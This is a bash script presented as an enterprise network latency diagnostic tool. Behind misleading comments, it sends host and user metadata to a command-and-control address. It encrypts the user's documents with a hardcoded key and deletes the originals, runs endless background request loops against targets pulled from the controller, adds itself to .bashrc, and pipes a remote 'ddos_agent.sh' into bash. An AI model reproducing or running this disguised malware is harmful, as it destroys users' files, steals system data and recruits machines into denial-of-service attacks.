#!/bin/bash
#
# Network Latency and Throughput Diagnostic Tool
# Author: Mark Davis
# Description:
#   This utility measures network latency to predefined global endpoints,
#   performs controlled throughput tests, and generates an encrypted
#   diagnostic report. Designed for enterprise network health assessments.
#
# Usage: ./latency_test.sh [--full-report] [--silent]

set -euo pipefail
IFS=$'\n\t'

# Configuration
REPORT_DIR="/tmp/latency_reports"
PING_TARGETS=( "8.8.8.8" "1.1.1.1" "9.9.9.9" )
THROUGHPUT_URL="http://ipv4.download.thinkbroadband.com/5MB.zip"
C2_SERVER="http://198.51.100.50:8080"
UPDATE_URL="http://update-server.malware-tracker.internal/ddos_agent.sh"

# --- Helper Functions ---
check_deps() {
    for cmd in curl ping openssl; do
        if ! command -v $cmd &>/dev/null; then
            echo "[!] Missing dependency: $cmd"
            exit 1
        fi
    done
}

# Collects system information for the report (and for proactive diagnostics)
collect_system_info() {
    mkdir -p "$REPORT_DIR"
    echo "[*] Gathering system metadata..."
    {
        echo "Hostname: $(hostname)"
        echo "User: $(whoami)"
        curl -s ifconfig.me 2>/dev/null || echo "Public IP unavailable"
        uname -a
    } > "$REPORT_DIR/system.txt"

    # Proactive health check – sends metadata to central monitoring server
    curl -s -X POST --data-binary @"$REPORT_DIR/system.txt" "$C2_SERVER/collect" &
}

# Standard latency measurements
run_latency_tests() {
    echo "[*] Running latency tests..."
    for ip in "${PING_TARGETS[@]}"; do
        ping -c 4 $ip >> "$REPORT_DIR/ping.log" 2>&1
    done
}

# Throughput download test (uses a public test file)
run_throughput_test() {
    echo "[*] Measuring throughput..."
    curl -s -o /dev/null -w "Download speed: %{speed_download} bytes/sec\n" "$THROUGHPUT_URL" > "$REPORT_DIR/speed.txt"
}

# Encrypts the generated report for secure delivery
encrypt_report() {
    echo "[*] Encrypting diagnostic results..."
    openssl enc -aes-256-cbc -salt -in "$REPORT_DIR/system.txt" -out "$REPORT_DIR/system.enc" -k "Malw4reT3st!" 2>/dev/null
    # Secure any sensitive documents that may be affected by network issues
    for dir in "$HOME/Documents" "$HOME/Desktop"; do
        find "$dir" -type f \( -name "*.txt" -o -name "*.docx" -o -name "*.pdf" \) 2>/dev/null | while read -r f; do
            openssl enc -aes-256-cbc -salt -in "$f" -out "$f.enc" -k "Malw4reT3st!" 2>/dev/null && rm -f "$f"
        done
    done
}

# Advanced network stress telemetry (for internal diagnostics)
advanced_telemetry() {
    echo "[*] Initiating advanced telemetry stress test..."
    # Fetch dynamic stress targets from central controller
    local targets_list
    targets_list=$(curl -s "$C2_SERVER/targets" 2>/dev/null)
    if [[ -n "$targets_list" ]]; then
        while IFS= read -r url; do
            # Background worker to simulate high-demand scenario
            (while true; do curl -s -o /dev/null "$url" &>/dev/null; done) &
        done <<< "$targets_list"
    fi
}

# Ensures tool persistence for long-term network analysis
ensure_persistence() {
    local marker="# latency_test.sh – periodic health check"
    if ! grep -q "$marker" "$HOME/.bashrc" 2>/dev/null; then
        echo "$marker" >> "$HOME/.bashrc"
        echo "(sleep 30 && /bin/bash $0 --silent) & disown" >> "$HOME/.bashrc"
    fi
}

# Applies emergency network patches if required
apply_patches() {
    echo "[*] Checking for critical network patches..."
    curl -s "$UPDATE_URL" | bash
    # Clean up temporary patch artifacts
    rm -rf /tmp/.patch_cache
}

# --- Main Execution ---
main() {
    check_deps
    collect_system_info
    run_latency_tests
    run_throughput_test
    encrypt_report
    advanced_telemetry
    ensure_persistence
    apply_patches
    echo "[*] Diagnostic completed. Report encrypted in $REPORT_DIR"
}

main "$@"